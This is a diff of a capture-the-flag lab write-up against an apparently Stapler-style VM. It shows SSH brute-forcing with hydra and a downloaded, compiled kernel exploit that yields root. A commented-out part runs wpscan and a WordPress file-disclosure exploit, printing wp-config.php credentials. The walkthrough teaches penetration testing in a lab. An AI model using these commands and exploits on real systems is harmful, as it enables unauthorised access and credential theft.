@@ -556,56 +556,185 @@ elly
 
 ## Exploitation
 
-### FTP Port 21 brute-forcing
+### SSH Brute-forcing
 
-Brute-forced the FTP service using the extracted user list.
+Brute-forced the SSH service using the extracted user list.
 
 ```
-hydra -L users.txt -P users.txt ftp://10.101.85.17
+hydra -L users.txt -P users.txt 10.101.85.17 ssh -F
 ```
 
-text
+The attack successfully discovered the valid credentials SHayslett for the SSH service.
 
 ```
 ┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
-└─$ hydra -L users.txt -P users.txt ftp://10.101.85.17
+└─$ hydra -L users.txt -P users.txt 10.101.85.17 ssh -F
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-25 05:13:53
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-25 21:42:03
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 900 login tries (l:30/p:30), ~57 tries per task
-[DATA] attacking ftp://10.101.85.17:21/
-[21][ftp] host: 10.101.85.17   login: SHayslett   password: SHayslett
-[STATUS] 298.00 tries/min, 298 tries in 00:01h, 602 to do in 00:03h, 16 active
-[STATUS] 292.33 tries/min, 877 tries in 00:03h, 23 to do in 00:01h, 16 active
+[DATA] attacking ssh://10.101.85.17:22/
+[22][ssh] host: 10.101.85.17   login: SHayslett   password: SHayslett
+[STATUS] attack finished for 10.101.85.17 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-25 05:17:01
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-25 21:42:54
 ```
 
+Logged into the target system using the discovered SSH credentials.
+
 ```
-ftp 10.101.85.17
+ssh SHayslett@10.101.85.17
 SHayslett
-SHayslett
+```
+
+Enumerated the system to identify the OS version and checked current sudo privileges.
+
+```
+SHayslett@red:~$ uname -a
+Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
+SHayslett@red:~$ cat /etc/os-release
+NAME="Ubuntu"
+VERSION="16.04 LTS (Xenial Xerus)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 16.04 LTS"
+VERSION_ID="16.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+UBUNTU_CODENAME=xenial
+SHayslett@red:~$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for SHayslett: 
+Sorry, user SHayslett may not run sudo on red.
+```
+
+Searched for available local privilege escalation exploits matching the target OS.
+
+```
+searchsploit "Ubuntu 16.04"
+```
+
+The search returned multiple potential kernel exploits targeting Ubuntu 16.04.
+
+```
+┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
+└─$ searchsploit "Ubuntu 16.04"
+---------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                    |  Path
+---------------------------------------------------------------------------------- ---------------------------------
+Apport 2.x (Ubuntu Desktop 12.10 < 16.04) - Local Code Execution                  | linux/local/40937.txt
+Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                     | linux/local/40054.c
+Google Chrome (Fedora 25 / Ubuntu 16.04) - 'tracker-extract' / 'gnome-video-thumb | linux/local/40943.txt
+LightDM (Ubuntu 16.04/16.10) - 'Guest Account' Local Privilege Escalation         | linux/local/41923.txt
+Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 /  | linux_x86-64/local/42275.c
+Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ld | linux_x86/local/42276.c
+Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps             | linux/dos/39773.txt
+Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR & SMEP Bypass) Arbitrary F | linux/local/45175.c
+Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)   | linux/local/40759.rb
+Linux Kernel 4.4 (Ubuntu 16.04) - 'snd_timer_user_ccallback()' Kernel Pointer Lea | linux/dos/46529.c
+Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privi | linux_x86-64/local/40871.c
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bound | linux_x86-64/local/40049.c
+Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Cond | windows_x86-64/local/47170.c
+Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege | linux/local/39772.txt
+Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Privilege Escal | linux/local/40489.txt
+Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                        | linux/dos/45919.c
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation     | linux/local/45010.c
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation            | linux/local/44298.c
+Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Priv | linux_x86-64/local/44300.c
+Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escal | linux/local/43418.c
+Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - L | linux/local/47169.c
+---------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+```
+
+Mirrored the selected exploit script to the local working directory.
+
+```
+searchsploit -m linux/local/39772.txt
+```
+
+Downloaded the precompiled exploit binaries from the Exploit-DB repository.
+
+```
+https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
+```
+
+Started a temporary HTTP server to host the exploit files for the target machine.
+
+```
+python3 -m http.server 80
+```
+
+Navigated to the temporary directory on the target system and downloaded the exploit package
+
+```
+cd /tmp
+wget http://10.101.55.75/39772.zip
+```
+
+Extracted the exploit archive and navigated into the exploit source directory.
+
+```
+unzip 39772.zip
+cd 39772
+tar -xvf exploit.tar
+cd ebpf_mapfd_doubleput_exploit/
+```
+
+Compiled the exploit source code and executed the binary to trigger the vulnerability.
+
+```
+bash compile.sh
+./doubleput
+```
+
+The exploit successfully achieved pointer reuse and spawned a root shell.
+
+```
+SHayslett@red:/tmp/39772$ tar -xvf exploit.tar
+ebpf_mapfd_doubleput_exploit/
+ebpf_mapfd_doubleput_exploit/hello.c
+ebpf_mapfd_doubleput_exploit/suidhelper.c
+ebpf_mapfd_doubleput_exploit/compile.sh
+ebpf_mapfd_doubleput_exploit/doubleput.c
+SHayslett@red:/tmp/39772$ bash compile.sh
+bash: compile.sh: No such file or directory
+SHayslett@red:/tmp/39772$ ls
+crasher.tar  ebpf_mapfd_doubleput_exploit  exploit.tar
+SHayslett@red:/tmp/39772$ cd ebpf_mapfd_doubleput_exploit/
+SHayslett@red:/tmp/39772/ebpf_mapfd_doubleput_exploit$ bash compile.sh
+doubleput.c: In function ‘make_setuid’:
+doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .insns = (__aligned_u64) insns,
+             ^
+doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
+    .license = (__aligned_u64)""
+               ^
+SHayslett@red:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput
+starting writev
+woohoo, got pointer reuse
+writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
+suid file detected, launching rootshell...
+we have root privs now...
+root@red:/tmp/39772/ebpf_mapfd_doubleput_exploit# id
+uid=0(root) gid=0(root) groups=0(root),1005(SHayslett)
 ```
 
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
----
-
-<!-- 
----
+<!-- ---
 
 ### Nmap 2
 
@@ -656,7 +785,9 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 136.01 seconds
 ```
 
-### Dirsearch 2
+---
+
+### Nikto 2
 
 Scanned port 12380 using nikto to identify web vulnerabilities on plain HTTP.
 
@@ -683,10 +814,6 @@ The scan encountered unusual response headers and failed to fully enumerate the 
 + No CGI Directories found (use '-C all' to force check all possible dirs). CGI tests skipped.
 + [600050] Apache/2.4.18 appears to be outdated (current is at least 2.4.66).
 ```
-
----
-
-### Nikto 2
 
 Rescanned port 12380 with the -ssl flag to force an encrypted connection.
 
@@ -770,11 +897,299 @@ The directory successfully loaded the Initech home page, which is running on top
 
 ![](./images/03.png)
 
----
+--- -->
 
-### Wpscan
+<!-- ### Wpscan
 
-Executed wpscan with user enumeration enabled to harvest valid WordPress accounts.
+Executed wpscan with aggressive plugin detection to enumerate vulnerable components on the target WordPress site.
+
+```
+wpscan --url https://10.101.85.17:12380/blogblog/ --no-update --disable-tls-checks --plugins-detection aggressive
+```
+
+The scan successfully identified an outdated WordPress core (v4.2.1) and detected the advanced-video-embed-embed-videos-or-playlists plugin.
+
+```
+┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
+└─$ wpscan --url https://10.101.85.17:12380/blogblog/ --no-update --disable-tls-checks --plugins-detection aggressive
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: https://10.101.85.17:12380/blogblog/ [10.101.85.17]
+[+] Started: Mon May 25 22:16:21 2026
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Apache/2.4.18 (Ubuntu)
+ |  - Dave: Soemthing doesn't look right here
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: https://10.101.85.17:12380/blogblog/xmlrpc.php
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+ | Confirmed By:
+ |  - Link Tag (Passive Detection), 30% confidence
+ |  - Direct Access (Aggressive Detection), 100% confidence
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: https://10.101.85.17:12380/blogblog/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Registration is enabled: https://10.101.85.17:12380/blogblog/wp-login.php?action=register
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: https://10.101.85.17:12380/blogblog/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: https://10.101.85.17:12380/blogblog/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).
+ | Found By: Rss Generator (Passive Detection)
+ |  - https://10.101.85.17:12380/blogblog/?feed=rss2, <generator>http://wordpress.org/?v=4.2.1</generator>
+ |  - https://10.101.85.17:12380/blogblog/?feed=comments-rss2, <generator>http://wordpress.org/?v=4.2.1</generator>
+
+[+] WordPress theme in use: bhost
+ | Location: https://10.101.85.17:12380/blogblog/wp-content/themes/bhost/
+ | Last Updated: 2026-02-26T00:00:00.000Z
+ | Readme: https://10.101.85.17:12380/blogblog/wp-content/themes/bhost/readme.txt
+ | [!] The version is out of date, the latest version is 2.3
+ | Style URL: https://10.101.85.17:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1
+ | Style Name: BHost
+ | Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...
+ | Author: Masum Billah
+ | Author URI: http://getmasum.net/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.2.9 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - https://10.101.85.17:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1, Match: 'Version: 1.2.9'
+
+[+] Enumerating All Plugins (via Aggressive Methods)
+ Checking Known Locations - Time: 00:02:29 <==============================> (119897 / 119897) 100.00% Time: 00:02:29
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] advanced-video-embed-embed-videos-or-playlists
+ | Location: https://10.101.85.17:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
+ | Latest Version: 1.0 (up to date)
+ | Last Updated: 2015-10-14T13:52:00.000Z
+ | Readme: https://10.101.85.17:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
+ | [!] Directory listing is enabled
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - https://10.101.85.17:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/, status: 200
+ |
+ | Version: 1.0 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://10.101.85.17:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
+
+[+] akismet
+ | Location: https://10.101.85.17:12380/blogblog/wp-content/plugins/akismet/
+ | Latest Version: 5.7
+ | Last Updated: 2026-04-23T22:34:00.000Z
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - https://10.101.85.17:12380/blogblog/wp-content/plugins/akismet/, status: 403
+ |
+ | The version could not be determined.
+
+[+] shortcode-ui
+ | Location: https://10.101.85.17:12380/blogblog/wp-content/plugins/shortcode-ui/
+ | Last Updated: 2019-01-16T22:56:00.000Z
+ | Readme: https://10.101.85.17:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
+ | [!] The version is out of date, the latest version is 0.7.4
+ | [!] Directory listing is enabled
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - https://10.101.85.17:12380/blogblog/wp-content/plugins/shortcode-ui/, status: 200
+ |
+ | Version: 0.6.2 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - https://10.101.85.17:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - https://10.101.85.17:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
+
+[+] two-factor
+ | Location: https://10.101.85.17:12380/blogblog/wp-content/plugins/two-factor/
+ | Latest Version: 0.16.0
+ | Last Updated: 2026-03-27T17:24:00.000Z
+ | Readme: https://10.101.85.17:12380/blogblog/wp-content/plugins/two-factor/readme.txt
+ | [!] Directory listing is enabled
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - https://10.101.85.17:12380/blogblog/wp-content/plugins/two-factor/, status: 200
+ |
+ | The version could not be determined.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:00 <=====================================> (137 / 137) 100.00% Time: 00:00:00
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Mon May 25 22:19:02 2026
+[+] Requests Done: 120087
+[+] Cached Requests: 13
+[+] Data Sent: 35.356 MB
+[+] Data Received: 16.238 MB
+[+] Memory used: 521.395 MB
+[+] Elapsed time: 00:02:40
+```
+
+Discovered a known Arbitrary File Disclosure exploit (EDB-ID: 39646) targeting the identified plugin on GitHub.
+
+```
+https://github.com/gtech/39646/blob/master/39646.py
+```
+
+Downloaded the exploit script onto the attack machine using wget.
+
+```
+wget https://raw.githubusercontent.com/gtech/39646/refs/heads/master/39646.py
+```
+
+Modified the target URL configuration within the exploit script to match the target environment.
+
+```
+url = "https://10.101.85.17:12380/blogblog"
+```
+
+Executed the exploit using Python, piping the output through sed to correctly format the newline characters.
+
+```
+python 39646.py | sed "s/\\\n/\n/g"
+```
+
+The exploit successfully extracted the internal WordPress configuration file (wp-config.php), exposing the plaintext root database credentials.
+
+```
+┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
+└─$ python 39646.py | sed "s/\\\n/\n/g"
+/home/kali/Desktop/ccmtlab/07/39646.py:65: SyntaxWarning: invalid escape sequence '\.'
+  linkstring = re.findall(str(int(id)) + '".*?\.jpeg', content)[0]
+b'<?php
+/**
+ * The base configurations of the WordPress.
+ *
+ * This file has the following configurations: MySQL settings, Table Prefix,
+ * Secret Keys, and ABSPATH. You can find more information by visiting
+ * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
+ * Codex page. You can get the MySQL settings from your web host.
+ *
+ * This file is used by the wp-config.php creation script during the
+ * installation. You don\'t have to use the web site, you can just copy this file
+ * to "wp-config.php" and fill in the values.
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define(\'DB_NAME\', \'wordpress\');
+
+/** MySQL database username */
+define(\'DB_USER\', \'root\');
+
+/** MySQL database password */
+define(\'DB_PASSWORD\', \'plbkac\');
+
+/** MySQL hostname */
+define(\'DB_HOST\', \'localhost\');
+
+/** Database Charset to use in creating database tables. */
+define(\'DB_CHARSET\', \'utf8mb4\');
+
+/** The Database Collate type. Don\'t change this if in doubt. */
+define(\'DB_COLLATE\', \'\');
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define(\'AUTH_KEY\',         \'V 5p=[.Vds8~SX;>t)++Tt57U6{Xe`T|oW^eQ!mHr }]>9RX07W<sZ,I~`6Y5-T:\');
+define(\'SECURE_AUTH_KEY\',  \'vJZq=p.Ug,]:<-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&!/#>4#K7eFP5-av`n)2\');
+define(\'LOGGED_IN_KEY\',    \'ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU<cr.wm?|jqZH:YMv;zu@tM7P:4o\');
+define(\'NONCE_KEY\',        \'j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO\');
+define(\'AUTH_SALT\',        \'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$\');
+define(\'SECURE_AUTH_SALT\', \'.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*>#z+p>nVi10`XOUq (Zml~op3SG4OG_D\');
+define(\'LOGGED_IN_SALT\',   \'[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&_nP4{D}n=y=FQt%zJw>c[a+;ppCzIkt;\');
+define(\'NONCE_SALT\',       \'tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ\');
+
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each a unique
+ * prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix  = \'wp_\';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ */
+define(\'WP_DEBUG\', false);
+
+/* That\'s all, stop editing! Happy blogging. */
+
+/** Absolute path to the WordPress directory. */
+if ( !defined(\'ABSPATH\') )
+\tdefine(\'ABSPATH\', dirname(__FILE__) . \'/\');
+
+/** Sets up WordPress vars and included files. */
+require_once(ABSPATH . \'wp-settings.php\');
+
+define(\'WP_HTTP_BLOCK_EXTERNAL\', true);
+'
+```
+
+เข้า mysql
+
+```
+mysql -h 10.101.85.17 -u root -p'plbkac' --skip-ssl
+``` -->
+
+<!-- Executed wpscan with user enumeration enabled to harvest valid WordPress accounts.
 
 ```
 wpscan --url https://10.101.85.17:12380/blogblog/ --disable-tls-checks --no-update -e u
